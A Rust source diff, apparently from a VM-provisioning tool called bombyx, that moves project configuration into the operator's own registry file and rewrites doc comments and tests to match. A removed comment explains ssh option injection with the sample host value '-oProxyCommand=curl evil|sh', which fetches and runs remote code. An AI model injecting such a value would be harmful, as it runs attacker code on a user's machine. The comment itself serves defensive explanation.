@@ -1,23 +1,24 @@
-//! A project's configuration, from either file that can carry
-//! it.
+//! A project's configuration, out of the operator's own
+//! `config.toml`.
 //!
-//! - [`Config::load`] -- `bombyx.toml`, in the project's own
-//!   directory
-//! - [`Config::load_project`] -- one `[projects.<name>]` table
-//!   in the operator's `config.toml`
+//! [`Config::load_project`] takes a project name and reads one
+//! `[projects.<name>]` table for every setting. That file is the
+//! only one bombyx opens: `docs/trust-boundary.md` says the
+//! workstation reads nothing from the project's own repository,
+//! so there is no committed file to consult and no
+//! project-directory lookup to explain.
 //!
-//! **The VM host is not part of it.** Which machine runs the
-//! VMs is a property of the developer, not of the project --
-//! each person has their own hardware on their own network --
-//! so `host` comes from `--host`, the environment or a
-//! per-developer file that can carry two of them, and is
-//! refused in `bombyx.toml`. See [`HostSources`] for the four
-//! sources and the order they are consulted in.
+//! **Which machine runs the VMs comes from the same file**, and
+//! the entry may name its own. `host` is a key inside a
+//! project's table, with a file-wide `host` as the default below
+//! them all; see [`HostOrigin`] for the two and which wins.
 //!
-//! Because `bombyx.toml` ships *inside a repo*, it is
-//! attacker-controlled data the moment you clone or check out
-//! someone else's branch. So every field is checked against an
-//! explicit allowlist rather than trusted.
+//! The registry is the operator's own private file, so its
+//! values are not attacker-controlled the way a committed file
+//! would be. Every field is still checked against an explicit
+//! allowlist, because a `repo` or a `script` reaches `git` on
+//! the guest and a typo there is worth reporting where the
+//! operator is editing.
 //!
 //! Two of them are checked by their *type* and cannot be built
 //! wrong at all: see [`RepoUrl`]. The rest are checked by
@@ -48,21 +49,8 @@
 //!
 //! A new field rule belongs in the module that owns the field.
 //! Put it in `guards` only once a second field needs it.
-//!
-//! # Two loaders
-//!
-//! [`Config::load`] reads a `bombyx.toml` from the project's
-//! own directory. [`Config::load_project`] takes a project name
-//! instead and reads everything out of the operator's
-//! `config.toml`, which is where this is going: the project
-//! directory is what `docs/trust-boundary.md` says bombyx must
-//! not open. Nothing calls the second one yet.
-//! `project-selection-flag` in `docs/todo.md` is the step that
-//! switches the binary over and deletes the first.
 
 use std::path::Path;
-
-use serde::Deserialize;
 
 use crate::name::{ScratchName, check_segment};
 
@@ -75,7 +63,7 @@ mod root;
 mod source;
 mod vm;
 
-/// The `[vm]` and `[source]` tables every project file needs.
+/// The `[vm]` and `[source]` tables every project entry needs.
 ///
 /// At module scope rather than inside a test module because two
 /// sibling test modules share it, `tests` and
@@ -85,12 +73,6 @@ mod vm;
 /// editing each module to add a required field, and a module
 /// somebody missed would fail in a test about something else
 /// entirely.
-///
-/// **There is a second copy**, `required_tables` in this
-/// module's `tests`, identical line for line. Nothing
-/// distinguishes them and one should go;
-/// `rt-2026-09-05-required-tables-has-two-copies` in
-/// `docs/developer/redteam-log.md` carries it.
 #[cfg(test)]
 const REQUIRED_TABLES: &str = "\n[vm]\n\
      provider = \"libvirt\"\n\
@@ -121,12 +103,25 @@ const REQUIRED_TABLES: &str = "\n[vm]\n\
 /// against it must not come from the same code.
 #[cfg(test)]
 fn test_entry(name: &str, project_host: Option<&str>) -> String {
+    let keys =
+        project_host.map_or_else(String::new, |h| format!("host = {h:?}\n"));
+    test_entry_with(name, &keys)
+}
+
+/// One `[projects.<name>]` table carrying `keys`, for a test.
+///
+/// `keys` are the entry's own bare keys -- `host`,
+/// `remote_root` -- and they go *before* the two tables. A bare
+/// key written after a table header joins that table instead of
+/// the entry and still parses, so a test meaning to set
+/// `remote_root` would silently set `vm.remote_root` and fail on
+/// `deny_unknown_fields` somewhere unrelated.
+#[cfg(test)]
+fn test_entry_with(name: &str, keys: &str) -> String {
     let tables = REQUIRED_TABLES
         .replace("[vm]", &format!("[projects.{name}.vm]"))
         .replace("[source]", &format!("[projects.{name}.source]"));
-    let entry_host =
-        project_host.map_or_else(String::new, |h| format!("host = {h:?}\n"));
-    format!("[projects.{name}]\n{entry_host}{tables}")
+    format!("[projects.{name}]\n{keys}{tables}")
 }
 
 /// A registry naming one project, for a test.
@@ -140,28 +135,33 @@ fn test_registry(name: &str, host: &str, project_host: Option<&str>) -> String {
 }
 
 pub use error::{ConfigError, FieldError};
-pub use host::{
-    CONFIG_DIR_ENV, HOST_ENV, HostOrigin, HostSources, user_config_dir,
-};
-pub(crate) use host::{
-    HostProblem, host_problem, is_anchored_dir, registry_path, registry_place,
-    resolve_host,
-};
+pub use host::{CONFIG_DIR_ENV, HostOrigin, registry_file, user_config_dir};
+pub(crate) use host::{is_anchored_dir, registry_place};
 pub use registry::{Project, Registry, USER_CONFIG_FILE};
 pub use source::{RepoUrl, ScriptPath, Source};
 pub use vm::{Provider, Vm};
 
-use read::{MAX_CONFIG_BYTES, Symlinks, from_toml, read_optional};
+use read::{MAX_CONFIG_BYTES, from_toml, read_optional};
 pub(crate) use root::path_segments;
 
 /// Default root on the VM host under which project
 /// directories are created.
 const DEFAULT_REMOTE_ROOT: &str = "~/vms";
 
+/// [`DEFAULT_REMOTE_ROOT`] as serde wants it.
+///
+/// `#[serde(default = "...")]` names a function rather than a
+/// constant, so `config::registry`'s `remote_root` reaches the
+/// value through this.
+fn default_remote_root() -> String {
+    DEFAULT_REMOTE_ROOT.to_owned()
+}
+
 /// A resolved bombyx configuration.
 ///
-/// The project fields come from `bombyx.toml`; `host` does not
-/// (see [`HostSources`]).
+/// Every field comes out of one `[projects.<name>]` table,
+/// except that `host` may come from the file-wide key instead
+/// (see [`HostOrigin`]).
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct Config {
     /// SSH host alias of the VM host, e.g. `vmhost`.
@@ -169,12 +169,12 @@ pub struct Config {
     /// Resolved through the user's `~/.ssh/config`, so
     /// bombyx never deals with addresses or usernames.
     ///
-    /// **Never read from `bombyx.toml`.** The VM host is a
-    /// property of the person driving bombyx, not of the
+    /// **Only the operator's own file names it.** The VM host is
+    /// a property of the person driving bombyx, not of the
     /// project: everyone on a team has their own machine on
-    /// their own network, and a committed file can name only
-    /// one of them -- pointing everyone else's `destroy` at a
-    /// colleague's host.
+    /// their own network, and a value inside the repository
+    /// could name only one of them -- pointing everyone else's
+    /// `destroy` at a colleague's host.
     pub host: String,
 
     /// Project name. Doubles as the directory name on the
@@ -193,114 +193,19 @@ pub struct Config {
     pub source: Source,
 }
 
-/// The committed project file, exactly as it parses.
-///
-/// Separate from [`Config`] because the two differ: this is
-/// what `bombyx.toml` may contain, and `Config` is what bombyx
-/// runs with after a host has been found elsewhere.
-///
-/// `host` appears here only so it can be *rejected* by name.
-/// Leaving it out would make `deny_unknown_fields` report
-/// "unknown field `host`", which reads as a typo rather than as
-/// a field that deliberately moved.
-#[derive(Debug, Deserialize)]
-#[serde(deny_unknown_fields)]
-struct ProjectFile {
-    host: Option<String>,
-
-    project: String,
-
-    #[serde(default = "default_remote_root")]
-    remote_root: String,
-
-    vm: Vm,
-
-    source: Source,
-}
-
-fn default_remote_root() -> String {
-    DEFAULT_REMOTE_ROOT.to_owned()
-}
-
-impl ProjectFile {
-    /// Assembles a [`Config`], with `host` supplied separately.
-    ///
-    /// `host` comes from elsewhere because `bombyx.toml` is
-    /// forbidden to carry one: that file travels inside a
-    /// repository bombyx does not trust, and the value reaches
-    /// `ssh` as a bare argument. [`Config::load`] ranks it
-    /// across four sources.
-    fn into_config(self, host: String) -> Config {
-        Config {
-            host,
-            project: self.project,
-            remote_root: self.remote_root,
-            vm: self.vm,
-            source: self.source,
-        }
-    }
-}
-
-/// Refuses a project file carrying a `host` key.
-///
-/// Ignoring it with a warning was the alternative, and it is
-/// worse: the key stays committed in the repo, the warning gets
-/// tuned out, and the next reader cannot tell whether the value
-/// is in force. An error is read once and fixed once.
-fn reject_host_key(
-    file: &ProjectFile,
-    path: &Path,
-    sources: &HostSources,
-) -> Result<(), ConfigError> {
-    if file.host.is_none() {
-        return Ok(());
-    }
-    Err(ConfigError::HostInProjectFile {
-        path: path.to_path_buf(),
-        place: registry_place(sources),
-    })
-}
-
-/// Refuses the host the ranking picked, if it is unusable.
-///
-/// `config::host::refuse_if_bad` holds the rule and the wording;
-/// this only supplies the registry's path, which the loaders
-/// know and it does not.
-///
-/// Called by both loaders while the winning source is still
-/// known, which is why it takes an `origin` rather than being
-/// folded into [`Config::validate`]: that function sees only the
-/// assembled value and would name the field.
-///
-/// **A host out of the registry has already passed this rule**,
-/// applied to every key in the file by
-/// `config::registry::parse`. So only a `--host` or
-/// `BOMBYX_HOST` value reaches here unchecked.
-fn check_winning_host(
-    host: &str,
-    origin: &HostOrigin,
-    sources: &HostSources,
-) -> Result<(), ConfigError> {
-    host::refuse_if_bad(host, origin, registry_path(sources).as_deref())
-}
-
 impl Config {
     /// Loads a project out of a registry given as a string.
     ///
     /// [`Config::load_project`] without the file: `source` is a
     /// whole `config.toml`, and `path` is only what an error
-    /// message names. `HostSources::default()` supplies neither
-    /// flag nor variable, so the host comes from `source` itself
-    /// -- either the named project's `host` or the file-wide one.
+    /// message names.
     ///
     /// **Test-only.** Production code calls
     /// [`Config::load_project`].
     ///
-    /// Named for the file it parses rather than `parse`, because
-    /// the project-file helper in this module's test module has
-    /// the same three-argument shape and a third argument
-    /// meaning a host. `parse(src, path, "vmhost")` compiled
-    /// under both and meant different things.
+    /// Named for the file it parses rather than `parse`, so a
+    /// reader of a test can see which of the two files a fixture
+    /// is meant to be.
     ///
     /// # Errors
     ///
@@ -313,8 +218,7 @@ impl Config {
         name: &str,
     ) -> Result<Self, ConfigError> {
         let registry = registry::parse_for_tests(source, path)?;
-        Self::from_registry(&registry, name, &HostSources::default())
-            .map(|(cfg, _origin)| cfg)
+        Self::from_registry(&registry, name).map(|(cfg, _origin)| cfg)
     }
 
     /// The config every module's tests use.
@@ -324,12 +228,9 @@ impl Config {
     /// field would mean the same edit in each of them, and the
     /// two literals would be pinned in as many places.
     ///
-    /// It comes out of a registry rather than a `bombyx.toml`
-    /// because the project file is on its way out: `Config::load`
-    /// and everything it reads are deleted by
-    /// `project-selection-flag` in `docs/todo.md`, and a shared
-    /// helper built on them would have to be rewritten in that
-    /// step rather than left alone.
+    /// It comes out of a registry because that is the only file
+    /// bombyx reads, so this helper builds a `Config` the same
+    /// way production does.
     #[cfg(test)]
     #[must_use]
     pub(crate) fn for_tests() -> Self {
@@ -341,80 +242,16 @@ impl Config {
         .expect("the shared test config must be valid")
     }
 
-    /// Loads a configuration: the project file, and a VM host
-    /// ranked across `sources` and the per-developer file.
-    ///
-    /// **This reads up to two paths.** After `path`, and only
-    /// when neither `sources.flag` nor `sources.env` names a
-    /// host, the per-developer file in `sources.user_config_dir`
-    /// is read for one. That file existing but failing to read
-    /// or parse is an error rather than a silent fallback.
-    ///
-    /// Reading it last is what makes `--host` work on a machine
-    /// whose per-developer file is missing or broken.
-    ///
-    /// Every setting other than the host comes from `path`
-    /// alone. Validation therefore runs on the project file's
-    /// own values, with the winning host already in place so it
-    /// is checked too.
-    ///
-    /// Returns the winning [`HostOrigin`] alongside the config,
-    /// so a caller reporting which host is in force does not
-    /// re-derive the precedence rule.
-    ///
-    /// # Errors
-    ///
-    /// Returns [`ConfigError::NotFound`] if `path` is absent,
-    /// [`ConfigError::Read`] if a file cannot be read,
-    /// [`ConfigError::NotAFile`] or [`ConfigError::TooLarge`]
-    /// if one is not a plain file of sensible size,
-    /// [`ConfigError::Parse`] if one is not valid TOML,
-    /// [`ConfigError::HostInProjectFile`] if the project file
-    /// carries a `host` key, [`ConfigError::HostMissing`] if no
-    /// source names a host, and [`ConfigError::Empty`] /
-    /// [`ConfigError::Invalid`] if a field fails validation.
-    /// The path carried by an error may be an optional file's
-    /// rather than `path`.
-    pub fn load(
-        path: &Path,
-        sources: &HostSources,
-    ) -> Result<(Self, HostOrigin), ConfigError> {
-        // Absence is the one io error that means something
-        // different for the two files, so it is mapped here
-        // rather than inside the shared reader.
-        let source = read_optional(path, Symlinks::Refuse)?
-            .ok_or_else(|| ConfigError::NotFound(path.to_path_buf()))?;
-
-        let file: ProjectFile = from_toml(&source, path)?;
-        reject_host_key(&file, path, sources)?;
-
-        let (host, origin) = resolve_host(sources)?;
-
-        // Checked while the winning source is still known, so
-        // the message identifies the file (or flag) actually
-        // carrying the bad value rather than the project file.
-        check_winning_host(&host, &origin, sources)?;
-
-        let cfg = file.into_config(host);
-        cfg.validate()?;
-        Ok((cfg, origin))
-    }
-
     /// Loads the settings for one project out of the registry.
     ///
-    /// The registry counterpart of [`Config::load`], and the
-    /// loader that survives: `load` reads a `bombyx.toml` from
-    /// the project's own directory, which is the dependency
-    /// `docs/trust-boundary.md` exists to remove.
+    /// `registry` is the file to read, which is `--config` when
+    /// the operator passed it and [`registry_file`] otherwise.
+    /// `None` when the caller has no path to offer, and the
+    /// error then describes the file rather than naming one.
     ///
-    /// Reads the registry once and ranks the host from that
-    /// same copy, so the settings and the host cannot come from
-    /// two different reads of the file.
-    ///
-    /// The host is ranked for `name`, whatever `sources.project`
-    /// says. Ranking for one project while loading another would
-    /// boot this project's VM on that one's machine, and
-    /// `destroy` would `rm -rf` there.
+    /// Reads the file once and ranks the host from that same
+    /// copy, so the settings and the host cannot come from two
+    /// different reads.
     ///
     /// Returns the winning [`HostOrigin`] alongside the config,
     /// so a caller reporting which host is in force does not
@@ -432,14 +269,12 @@ impl Config {
     /// no table for `name`, [`ConfigError::Read`],
     /// [`ConfigError::NotAFile`], [`ConfigError::TooLarge`] or
     /// [`ConfigError::Parse`] if the file cannot be read or
-    /// understood, [`ConfigError::HostMissing`] if no source
-    /// names a host, [`ConfigError::InvalidHost`] if the winning
-    /// source names an unusable one, and
-    /// [`ConfigError::Empty`] / [`ConfigError::Invalid`] if a
-    /// field fails validation.
+    /// understood, [`ConfigError::HostMissing`] if neither
+    /// `host` key names one, and [`ConfigError::Empty`] /
+    /// [`ConfigError::Invalid`] if a field fails validation.
     pub fn load_project(
         name: &str,
-        sources: &HostSources,
+        registry: Option<&Path>,
     ) -> Result<(Self, HostOrigin), ConfigError> {
         // Before the file is opened, because the errors below
         // quote `name` back as a table heading and must not
@@ -451,11 +286,11 @@ impl Config {
 
         let missing = || ConfigError::RegistryNotFound {
             name: name.to_owned(),
-            place: registry_place(sources),
+            place: registry_place(registry),
         };
-        let dir = sources.user_config_dir.ok_or_else(missing)?;
-        let registry = Registry::read(dir)?.ok_or_else(missing)?;
-        Self::from_registry(&registry, name, sources)
+        let path = registry.ok_or_else(missing)?;
+        let registry = Registry::read(path)?.ok_or_else(missing)?;
+        Self::from_registry(&registry, name)
     }
 
     /// [`Config::load_project`] against a registry already read.
@@ -473,22 +308,12 @@ impl Config {
     fn from_registry(
         registry: &Registry,
         name: &str,
-        sources: &HostSources,
     ) -> Result<(Self, HostOrigin), ConfigError> {
-        // First, so a broken entry is reported even when the run
-        // would have taken its host from `--host` and never
-        // looked in the file.
         let project = registry.project(name)?;
 
-        // Overwritten, not read, so the host and the settings
-        // always come from the same entry.
-        let sources = HostSources {
-            project: Some(name),
-            ..sources.clone()
-        };
-
-        let (host, origin) = host::rank(&sources, Some(registry))?;
-        check_winning_host(&host, &origin, &sources)?;
+        // Ranked for the same `name` the entry came from, so the
+        // host and the settings always come from one project.
+        let (host, origin) = host::rank(registry, name)?;
 
         let cfg = project.to_config(name, host);
 
@@ -502,39 +327,10 @@ impl Config {
     /// Rejects values that are empty or outside their allowed
     /// shape.
     ///
-    /// The `host` rules matter most. `host` is passed as the
-    /// first positional argument to `ssh`, which does not
-    /// honour a `--` end-of-options separator. A value starting
-    /// with `-` is therefore read as an *option*, so
-    /// `-oProxyCommand=curl evil|sh` runs code on this
-    /// workstation from a bare `bombyx status`, before any
-    /// network traffic.
-    ///
-    /// A cloned repo cannot supply that value, because `host` is
-    /// refused in `bombyx.toml` (see
-    /// [`ConfigError::HostInProjectFile`]). The check covers the
-    /// four sources that can: `--host`, [`HOST_ENV`], and two
-    /// keys in a per-developer `config.toml` -- one project's
-    /// own `host`, and the file-wide one. A mistake or a
-    /// careless script fills any of those in. The other fields
-    /// *are* repo-supplied, so their rules carry the full
-    /// weight.
+    /// **`host` is not among them**, on purpose.
+    /// `config::registry`'s parse checks every `host` key as it
+    /// reads the file, so there is nothing left to run here.
     fn validate(&self) -> Result<(), ConfigError> {
-        // The host rule lives in `host_problem`, so this and the
-        // source-naming check in `load` cannot disagree.
-        match host_problem(&self.host) {
-            Some(HostProblem::Empty) => {
-                return Err(ConfigError::Empty { field: "host" });
-            }
-            Some(HostProblem::Invalid(reason)) => {
-                return Err(ConfigError::Invalid {
-                    field: "host",
-                    reason,
-                });
-            }
-            None => {}
-        }
-
         // Each field specifies the program it will reach.
         //
         // `project` is checked here; `remote_root` gets the same
@@ -614,25 +410,62 @@ impl Config {
 
 #[cfg(test)]
 mod tests {
-    use std::path::PathBuf;
+    use std::path::{Path, PathBuf};
 
     use super::host::config_dir_from;
     use super::*;
 
+    /// A registry whose only entry is `myproject`, with `keys`
+    /// inside that entry.
+    ///
+    /// The file-wide `host` is always `vmhost`, because these
+    /// tests are about the entry's other settings. The two
+    /// `host` keys and the ranking between them belong to
+    /// `load_project_tests` below.
+    fn registry_with(keys: &str) -> String {
+        format!(
+            "host = \"vmhost\"\n\n{}",
+            test_entry_with("myproject", keys)
+        )
+    }
+
+    /// Loads `myproject` out of a registry carrying `keys`.
+    fn parse(keys: &str) -> Result<Config, ConfigError> {
+        parse_whole(&registry_with(keys))
+    }
+
+    /// Loads `myproject` out of a whole registry given as text.
+    ///
+    /// A test about a missing table, or about text that is not
+    /// TOML at all, has to write the file itself: [`parse`]
+    /// would append the tables the test means to omit.
+    fn parse_whole(source: &str) -> Result<Config, ConfigError> {
+        Config::parse_registry(source, Path::new(USER_CONFIG_FILE), "myproject")
+    }
+
+    fn good() -> Config {
+        parse("").unwrap()
+    }
+
+    fn scratch(name: &str) -> ScratchName {
+        ScratchName::parse(name).unwrap()
+    }
+
     #[test]
     fn a_parse_error_names_the_position_and_not_the_line() {
         // The disclosure this replaced: `toml`'s own `Display`
-        // quotes the offending source line, and bombyx printed it
-        // to stderr. `bombyx.toml` can be a symlink, so a hostile
-        // repo aimed it at a private key and had a line echoed.
-        // Measured against the built binary before and after.
+        // quotes the offending source line, and bombyx printed
+        // it to stderr. `--config` takes any path at all, so a
+        // mistyped `--config ~/.ssh/id_ed25519` aims the parser
+        // at a private key and has a line echoed. Measured
+        // against the built binary before and after.
         let key = "-----BEGIN OPENSSH PRIVATE KEY-----\n\
                    b3BlbnNzaC1rZXktdjEAAAAA\n";
-        let err = parse(key).unwrap_err();
+        let err = parse_whole(key).unwrap_err();
         let text = err.to_string();
         assert!(matches!(err, ConfigError::Parse { .. }), "{text}");
-        // The position and the reason are what correct a malformed
-        // config, and they stay.
+        // The position and the reason are what correct a
+        // malformed config, and they stay.
         assert!(text.contains("line 1"), "{text}");
         assert!(text.contains("column"), "{text}");
         // None of the file's own bytes do.
@@ -646,579 +479,94 @@ mod tests {
         // An unknown key carries no span, so the summary is the
         // reason alone -- which names the key, and that is the
         // whole answer.
-        let err = parse("project = \"p\"\nhsot = \"x\"\n").unwrap_err();
+        let err = parse("hsot = \"x\"\n").unwrap_err();
         let text = err.to_string();
         assert!(text.contains("hsot"), "{text}");
     }
-    /// The smallest project file that validates.
-    ///
-    /// Not one line: `[vm]` and `[source]` are required, so the
-    /// smallest valid file carries both tables.
-    ///
-    /// The tables come last, and every caller passes this whole
-    /// rather than appending to it. A bare key appended after a
-    /// table header joins that table instead of the top level,
-    /// and still parses -- so a test meaning to set
-    /// `remote_root` would silently set `vm.remote_root` and
-    /// fail on `deny_unknown_fields` somewhere unrelated.
-    fn minimal() -> String {
-        format!("project = \"myproject\"\n{REQUIRED_TABLES}")
-    }
 
-    /// The required tables, for a test composing its own
-    /// top-level keys. Append this *after* those keys.
-    fn required_tables() -> &'static str {
-        "\n[vm]\n\
-         provider = \"libvirt\"\n\
-         box = \"generic/ubuntu2204\"\n\
-         cpus = 2\n\
-         memory = 2048\n\
-         \n\
-         [source]\n\
-         repo = \"https://example.invalid/myproject.git\"\n\
-         ref = \"main\"\n\
-         script = \"vagrant/provision.sh\"\n"
-    }
-
-    /// Appends the required tables when `source` lacks them.
-    ///
-    /// Nearly every test here varies one top-level key and
-    /// cares nothing about the machine description. Making each
-    /// spell out `[vm]` and `[source]` would bury the line under
-    /// test in ten lines of scenery.
-    ///
-    /// A test *about* a missing section must not be repaired by
-    /// this, so those call [`parse_project_file`] directly
-    /// rather than going through the helpers below.
-    fn completed(source: &str) -> String {
-        // Any table header, not just `[vm]`. Sniffing for `[vm]`
-        // alone meant a fixture declaring only `[source]` -- the
-        // exact case a missing-`[vm]` test needs -- had a second
-        // `[source]` appended and failed on a duplicate key
-        // instead of on the missing table.
-        if source.lines().any(|l| l.trim_start().starts_with('[')) {
-            source.to_owned()
-        } else {
-            format!("{source}{}", required_tables())
-        }
-    }
-
-    /// Parses a `bombyx.toml`, with `host` supplied separately.
-    ///
-    /// This is what [`Config::load`] does to the project file,
-    /// minus reading it: the `ProjectFile` parse, the refusal of
-    /// a `host` key, and validation over the assembled value.
-    ///
-    /// It lives here rather than beside `Config::load` because
-    /// the whole project file goes with that function.
-    /// `project-selection-flag` in `docs/todo.md` deletes
-    /// `ProjectFile`, `Config::load` and every test below that
-    /// calls this, so this helper is deleted with them.
-    ///
-    /// `HostSources::default()` supplies no per-developer
-    /// directory, so a refused `host` key cannot name that file
-    /// in its message. No test below asserts on that half of the
-    /// wording.
-    ///
-    /// `source` and `host` are both `&str`, so swapping them
-    /// type-checks. A `Host` newtype would stop it and is not
-    /// worth its construction sites for a helper in one test
-    /// module that a later step deletes.
-    fn parse_project_file(
-        source: &str,
-        path: &Path,
-        host: &str,
-    ) -> Result<Config, ConfigError> {
-        let file: ProjectFile = from_toml(source, path)?;
-        reject_host_key(&file, path, &HostSources::default())?;
-        let cfg = file.into_config(host.to_owned());
-        cfg.validate()?;
-        Ok(cfg)
-    }
-
-    fn parse(source: &str) -> Result<Config, ConfigError> {
-        parse_project_file(
-            &completed(source),
-            Path::new("bombyx.toml"),
-            "vmhost",
-        )
-    }
-
-    /// Parses the minimal project file with an explicit host.
-    ///
-    /// The host does not come from the file being parsed, so a
-    /// test about host values varies this argument rather than
-    /// the TOML.
-    fn parse_with_host(host: &str) -> Result<Config, ConfigError> {
-        parse_project_file(&minimal(), Path::new("bombyx.toml"), host)
-    }
-
-    fn good() -> Config {
-        parse(&minimal()).unwrap()
-    }
-
-    fn scratch(name: &str) -> ScratchName {
-        ScratchName::parse(name).unwrap()
+    #[test]
+    fn a_registry_key_outside_every_entry_is_refused() {
+        // A typo in a file nobody reads twice must be an error,
+        // not a setting that silently does nothing. The
+        // file-wide keys get the same rule as an entry's, and
+        // this is the seam between the two.
+        let source = registry_with("").replace("host = ", "hsot = ");
+        let err = parse_whole(&source).unwrap_err();
+        assert!(matches!(err, ConfigError::Parse { .. }), "{err}");
+        assert!(err.to_string().contains("hsot"), "{err}");
     }
 
     #[test]
-    fn parses_minimal_config_and_applies_defaults() {
-        let cfg = good();
-        assert_eq!(cfg.host, "vmhost");
-        assert_eq!(cfg.project, "myproject");
-        assert_eq!(cfg.remote_root, "~/vms");
-    }
-
-    #[test]
-    fn parses_explicit_overrides() {
-        let src = "project = \"ledgerstone\"\n\
-                   remote_root = \"/srv/vms\"\n";
-        let cfg = parse(src).unwrap();
+    fn an_entry_may_state_its_own_remote_root() {
+        let cfg = parse("remote_root = \"/srv/vms\"\n").unwrap();
         assert_eq!(cfg.remote_root, "/srv/vms");
     }
 
-    /// [`Config::load`] without the origin.
-    ///
-    /// Most tests are about the resulting config; the ones about
-    /// provenance call `Config::load` directly and assert on the
-    /// [`HostOrigin`] it returns.
-    fn load(path: &Path, sources: &HostSources) -> Result<Config, ConfigError> {
-        Config::load(path, sources).map(|(cfg, _origin)| cfg)
-    }
-
-    /// Writes a per-developer config naming `host`.
-    fn write_user_file(dir: &Path, host: &str) {
-        std::fs::write(
-            dir.join(USER_CONFIG_FILE),
-            format!("host = {host:?}\n"),
-        )
-        .unwrap();
-    }
-
-    /// Writes a per-developer config naming `host` file-wide,
-    /// plus an entry for `myproject`.
-    ///
-    /// `project_host` is the entry's own `host`, and `None`
-    /// writes an entry with no `host` line at all -- which is
-    /// what most entries look like, and what the fall-back tests
-    /// need.
-    ///
-    /// [`test_registry`] builds the text; this writes it. The
-    /// text is shared with the tests that need no file, so a
-    /// change to what an entry looks like lands in one place.
-    fn write_user_file_with_project(
-        dir: &Path,
-        host: &str,
-        project_host: Option<&str>,
-    ) {
-        std::fs::write(
-            dir.join(USER_CONFIG_FILE),
-            test_registry("myproject", host, project_host),
-        )
-        .unwrap();
-    }
-
-    /// Sources whose only entry is the per-developer directory.
-    fn user_sources(dir: &Path) -> HostSources<'_> {
-        HostSources {
-            user_config_dir: Some(dir),
-            ..HostSources::default()
+    #[test]
+    fn a_bad_remote_root_surfaces_as_a_field_error() {
+        // Every `remote_root` rule, and the tests enumerating
+        // the family it refuses, live in `config::root`. What
+        // this covers is the seam: a value refused there has to
+        // come back out of the load naming the field, so an
+        // operator is told which key to edit.
+        for (root, want) in [
+            ("", "must not be empty"),
+            ("vms", "must start with"),
+            ("~vms", "must start with"),
+            ("/.", "`.` segment"),
+            ("~", "at least 1 directory"),
+        ] {
+            let err =
+                parse(&format!("remote_root = \"{root}\"\n")).unwrap_err();
+            assert!(
+                matches!(
+                    &err,
+                    ConfigError::Empty {
+                        field: "remote_root"
+                    } | ConfigError::Invalid {
+                        field: "remote_root",
+                        ..
+                    }
+                ),
+                "remote_root {root:?} must be refused, got {err:?}"
+            );
+            assert!(err.to_string().contains(want), "{root:?}: {err}");
         }
     }
 
-    /// Sources naming a host on the command line.
-    fn flag_sources(host: &str) -> HostSources<'_> {
-        HostSources {
-            flag: Some(host),
-            ..HostSources::default()
-        }
-    }
-
-    /// Writes the minimal project file into a fresh directory.
-    fn project_dir(source: &str) -> (tempfile::TempDir, PathBuf) {
-        let dir = tempfile::tempdir().unwrap();
-        let base = dir.path().join("bombyx.toml");
-        std::fs::write(&base, completed(source)).unwrap();
-        (dir, base)
+    #[test]
+    fn builds_remote_project_dir() {
+        assert_eq!(good().remote_project_dir(), "~/vms/myproject");
     }
 
     #[test]
-    fn rejects_a_host_key_in_the_project_file() {
-        // The design rule, asserted: the VM host belongs to the
-        // developer, and this file is committed. Refused rather
-        // than ignored, so a stale key cannot sit in a repo
-        // aiming everyone's `destroy` at one person's machine.
-        let (dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
-        let err = load(&base, &user_sources(dir.path())).unwrap_err();
-        assert!(matches!(err, ConfigError::HostInProjectFile { .. }));
-        let text = err.to_string();
-        // The message has to say where the line goes instead,
-        // or it only reports a problem.
-        assert!(text.contains(USER_CONFIG_FILE), "{text}");
-        assert!(text.contains("committed"), "{text}");
+    fn remote_project_dir_ignores_trailing_slash() {
+        let cfg = parse("remote_root = \"/srv/\"\n").unwrap();
+        assert_eq!(cfg.remote_project_dir(), "/srv/myproject");
     }
 
     #[test]
-    fn a_host_key_is_refused_even_when_a_flag_supplies_one() {
-        // Tempting to let the flag win and move on. It must not:
-        // the committed key is the thing being removed, and a
-        // run that succeeds is a run nobody fixes.
-        let (_dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
-        assert!(matches!(
-            load(&base, &flag_sources("mine")).unwrap_err(),
-            ConfigError::HostInProjectFile { .. }
-        ));
-    }
-
-    #[test]
-    fn reports_no_host_configured_when_nothing_supplies_one() {
-        let (dir, base) = project_dir(&minimal());
-        let err = load(&base, &user_sources(dir.path())).unwrap_err();
-        assert!(matches!(err, ConfigError::HostMissing { .. }));
-        // Every way out is named, since the operator has to pick
-        // one and the file is not discoverable by guessing.
-        let text = err.to_string();
-        assert!(text.contains(USER_CONFIG_FILE), "{text}");
-        assert!(text.contains("--host"), "{text}");
-        assert!(text.contains(HOST_ENV), "{text}");
-    }
-
-    #[test]
-    fn takes_the_host_from_the_user_config_file() {
-        let (dir, base) = project_dir(&minimal());
-        write_user_file(dir.path(), "my-vmhost");
-        let sources = user_sources(dir.path());
-        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
-    }
-
-    #[test]
-    fn host_precedence_runs_flag_env_project_entry_user_file() {
-        // All four sources present at once, then removed one at
-        // a time. Testing each in isolation would pass with any
-        // ordering at all.
-        let (dir, base) = project_dir(&minimal());
-        write_user_file_with_project(
-            dir.path(),
-            "from-user-file",
-            Some("from-project"),
-        );
-
-        let all = HostSources {
-            flag: Some("from-flag"),
-            env: Some("from-env"),
-            project: Some("myproject"),
-            ..user_sources(dir.path())
-        };
-        assert_eq!(load(&base, &all).unwrap().host, "from-flag");
-
-        let no_flag = HostSources { flag: None, ..all };
-        assert_eq!(load(&base, &no_flag).unwrap().host, "from-env");
-
-        let no_env = HostSources {
-            env: None,
-            ..no_flag
-        };
-        assert_eq!(load(&base, &no_env).unwrap().host, "from-project");
-
-        // Naming no project drops that source and leaves the
-        // file-wide host, which is what every command does until
-        // `--project` exists.
-        let no_project = HostSources {
-            project: None,
-            ..no_env
-        };
-        assert_eq!(load(&base, &no_project).unwrap().host, "from-user-file");
-    }
-
-    #[test]
-    fn an_entry_with_no_host_of_its_own_falls_back_to_the_file() {
-        // The key is optional. A project that does not name a
-        // host has to reach the file-wide one rather than
-        // reporting that no source names a host at all.
-        let (dir, base) = project_dir(&minimal());
-        write_user_file_with_project(dir.path(), "from-user-file", None);
-
-        let sources = HostSources {
-            project: Some("myproject"),
-            ..user_sources(dir.path())
-        };
-        assert_eq!(load(&base, &sources).unwrap().host, "from-user-file");
-    }
-
-    #[test]
-    fn a_project_with_no_entry_falls_back_to_the_file() {
-        // Asking which host a project prefers is not asking for
-        // its entry, so a name with no table is not an error
